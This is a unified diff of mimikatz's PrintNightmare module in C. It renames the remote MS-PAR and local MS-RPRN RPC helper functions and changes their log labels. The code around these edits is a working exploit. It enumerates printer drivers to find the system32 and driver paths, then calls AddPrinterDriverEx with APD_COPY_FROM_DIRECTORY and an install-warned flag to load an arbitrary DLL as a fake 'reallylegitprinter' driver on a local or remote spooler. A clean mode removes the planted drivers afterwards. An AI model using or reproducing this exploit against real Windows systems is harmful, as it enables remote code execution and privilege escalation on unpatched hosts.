@@ -1419,7 +1419,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 
 	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
 	{
-		kprintf(L"| Mode: Remote    : %s\n", szRemote);
+		kprintf(L"[ms-par/ncacn_ip_tcp] remote: %s\n", szRemote);
 		kull_m_rpc_getArgs(argc, argv, NULL, NULL, NULL, &szService, L"host", &AuthnSvc, ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), NULL, &secIdentity, NULL, TRUE);
 		if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szRemote, NULL, szService, TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DELEGATE, &hBinding, NULL))
 		{
@@ -1433,7 +1433,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 					{
 						szShortLibrary++;
 
-						if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(hBinding, DriverInfo.pEnvironment, &szSystem32, &szDriver))
+						if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_par(hBinding, DriverInfo.pEnvironment, &szSystem32, &szDriver))
 						{
 							if(kull_m_string_sprintf(&szKernelBase, L"%skernelbase.dll", szSystem32))
 							{
@@ -1452,10 +1452,10 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 											if(kull_m_string_sprintf(&szName2, MIMIKATZ L"-%s-reallylegitprinter", szRand1))
 											{
 												DriverInfo.pName = szName1;
-												if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(hBinding, &DriverInfo, NULL, szKernelBase) == ERROR_SUCCESS)
+												if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_par(hBinding, &DriverInfo, NULL, szKernelBase) == ERROR_SUCCESS)
 												{
 													DriverInfo.pName = szName2;
-													kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(hBinding, &DriverInfo, szSystem32, szShortLibrary);
+													kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_par(hBinding, &DriverInfo, szSystem32, szShortLibrary);
 												}
 												LocalFree(szName2);
 											}
@@ -1475,11 +1475,11 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 				}
 				else if(kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL))
 				{
-					kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete(hBinding, DriverInfo.pEnvironment, TRUE);
+					kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_par(hBinding, DriverInfo.pEnvironment, TRUE);
 				}
 				else
 				{
-					kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete(hBinding, DriverInfo.pEnvironment, FALSE);
+					kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_par(hBinding, DriverInfo.pEnvironment, FALSE);
 				}
 			}
 			else PRINT_ERROR(L"RpcBindingSetObject: 0x%08x (%u)\n", rpcStatus, rpcStatus);
@@ -1489,7 +1489,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 	}
 	else
 	{
-		kprintf(L"| Mode: Local\n");
+		kprintf(L"[ms-rprn/ncalrpc] local\n");
 		if(kull_m_rpc_createBinding(NULL, L"ncalrpc", NULL, NULL, NULL, FALSE, RPC_C_AUTHN_LEVEL_DEFAULT, NULL, RPC_C_IMP_LEVEL_DELEGATE, &hSpoolHandle, NULL))
 		{
 			if(kull_m_string_args_byName(argc, argv, L"library", &szLibrary, NULL))
@@ -1499,7 +1499,7 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 				{
 					szShortLibrary++;
 
-					if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_nrpn(DriverInfo.pEnvironment, &szSystem32, &szDriver))
+					if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_rprn(DriverInfo.pEnvironment, &szSystem32, &szDriver))
 					{
 						if(kull_m_string_sprintf(&szKernelBase, L"%skernelbase.dll", szSystem32))
 						{
@@ -1518,10 +1518,10 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 										if(kull_m_string_sprintf(&szName2, MIMIKATZ L"-%s-reallylegitprinter", szRand1))
 										{
 											DriverInfo.pName = szName1;
-											if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_nrpn(&DriverInfo, NULL, szKernelBase) == ERROR_SUCCESS)
+											if(kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_rprn(&DriverInfo, NULL, szKernelBase) == ERROR_SUCCESS)
 											{
 												DriverInfo.pName = szName2;
-												kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_nrpn(&DriverInfo, szSystem32, szShortLibrary);
+												kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_rprn(&DriverInfo, szSystem32, szShortLibrary);
 											}
 											LocalFree(szName2);
 										}
@@ -1540,28 +1540,27 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 			}
 			else if(kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL))
 			{
-				kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_nrpn(DriverInfo.pEnvironment, TRUE);
+				kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_rprn(DriverInfo.pEnvironment, TRUE);
 			}
 			else
 			{
-				kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_nrpn(DriverInfo.pEnvironment, FALSE);
+				kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_rprn(DriverInfo.pEnvironment, FALSE);
 			}
 
 			kull_m_rpc_deleteBinding(&hSpoolHandle);
 		}
-
 	}
 
 	return STATUS_SUCCESS;
 }
 
-void kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete(handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete)
+void kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_par(handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete)
 {
 	DWORD ret, i, cReturned = 0;
 	_PDRIVER_INFO_2 pDriverInfo;
 	PWSTR pName, pConfig;
 
-	if(kuhl_m_misc_printnightmare_CallEnumPrinters(hRemoteBinding, szEnvironment, &pDriverInfo, &cReturned))
+	if(kuhl_m_misc_printnightmare_CallEnumPrinters_par(hRemoteBinding, szEnvironment, &pDriverInfo, &cReturned))
 	{
 		for(i = 0; i < cReturned; i++)
 		{
@@ -1596,7 +1595,7 @@ void kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete(handle_t hRemoteB
 	}
 }
 
-BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(handle_t hRemoteBinding, LPCWSTR szEnvironment, LPWSTR *szSystem32, LPWSTR *szDriver)
+BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_par(handle_t hRemoteBinding, LPCWSTR szEnvironment, LPWSTR *szSystem32, LPWSTR *szDriver)
 {
 	BOOL status = FALSE;
 	DWORD i, cReturned = 0;
@@ -1605,7 +1604,7 @@ BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(handle_t hRe
 
 	if(szSystem32 && szDriver)
 	{
-		if(kuhl_m_misc_printnightmare_CallEnumPrinters(hRemoteBinding, szEnvironment, &pDriverInfo, &cReturned))
+		if(kuhl_m_misc_printnightmare_CallEnumPrinters_par(hRemoteBinding, szEnvironment, &pDriverInfo, &cReturned))
 		{
 			for(i = 0; (i < cReturned) && !status; i++)
 			{
@@ -1638,7 +1637,7 @@ BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(handle_t hRe
 	return status;
 }
 
-DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, LPCWSTR szSystem32, LPCWSTR pConfigFile)
+DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_par(handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, LPCWSTR szSystem32, LPCWSTR pConfigFile)
 {
 	DWORD ret, dwFlags = APD_COPY_FROM_DIRECTORY | 0x8000; // APD_INSTALL_WARNED_DRIVER;
 	DRIVER_CONTAINER container_info;
@@ -1691,7 +1690,7 @@ DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(handle_t hRemoteBinding,
 	return ret;
 }
 
-BOOL kuhl_m_misc_printnightmare_CallEnumPrinters(handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned)
+BOOL kuhl_m_misc_printnightmare_CallEnumPrinters_par(handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned)
 {
 	BOOL status = FALSE;
 	DWORD ret, cbNeeded = 0;
@@ -1725,13 +1724,13 @@ BOOL kuhl_m_misc_printnightmare_CallEnumPrinters(handle_t hRemoteBinding, LPCWST
 	return status;
 }
 
-void kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_nrpn(LPCWSTR szEnvironment, BOOL bIsDelete)
+void kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_rprn(LPCWSTR szEnvironment, BOOL bIsDelete)
 {
 	DWORD ret, i, cReturned = 0;
 	_PDRIVER_INFO_2 pDriverInfo;
 	PWSTR pName, pConfig;
 
-	if(kuhl_m_misc_printnightmare_CallEnumPrinters_nrpn(szEnvironment, &pDriverInfo, &cReturned))
+	if(kuhl_m_misc_printnightmare_CallEnumPrinters_rprn(szEnvironment, &pDriverInfo, &cReturned))
 	{
 		for(i = 0; i < cReturned; i++)
 		{
@@ -1766,7 +1765,7 @@ void kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete_nrpn(LPCWSTR szEn
 	}
 }
 
-BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_nrpn(LPCWSTR szEnvironment, LPWSTR *szSystem32, LPWSTR *szDriver)
+BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_rprn(LPCWSTR szEnvironment, LPWSTR *szSystem32, LPWSTR *szDriver)
 {
 	BOOL status = FALSE;
 	DWORD i, cReturned = 0;
@@ -1775,7 +1774,7 @@ BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_nrpn(LPCWSTR
 
 	if(szSystem32 && szDriver)
 	{
-		if(kuhl_m_misc_printnightmare_CallEnumPrinters_nrpn(szEnvironment, &pDriverInfo, &cReturned))
+		if(kuhl_m_misc_printnightmare_CallEnumPrinters_rprn(szEnvironment, &pDriverInfo, &cReturned))
 		{
 			for(i = 0; (i < cReturned) && !status; i++)
 			{
@@ -1808,7 +1807,7 @@ BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath_nrpn(LPCWSTR
 	return status;
 }
 
-DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_nrpn(PDRIVER_INFO_2 pInfo2, LPCWSTR szSystem32, LPCWSTR pConfigFile)
+DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_rprn(PDRIVER_INFO_2 pInfo2, LPCWSTR szSystem32, LPCWSTR pConfigFile)
 {
 	DWORD ret, dwFlags = APD_COPY_FROM_DIRECTORY | 0x8000; // APD_INSTALL_WARNED_DRIVER;
 	DRIVER_CONTAINER container_info;
@@ -1862,7 +1861,7 @@ DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx_nrpn(PDRIVER_INFO_2 pInf
 }
 
 
-BOOL kuhl_m_misc_printnightmare_CallEnumPrinters_nrpn(LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned)
+BOOL kuhl_m_misc_printnightmare_CallEnumPrinters_rprn(LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned)
 {
 	BOOL status = FALSE;
 	DWORD ret, cbNeeded = 0;
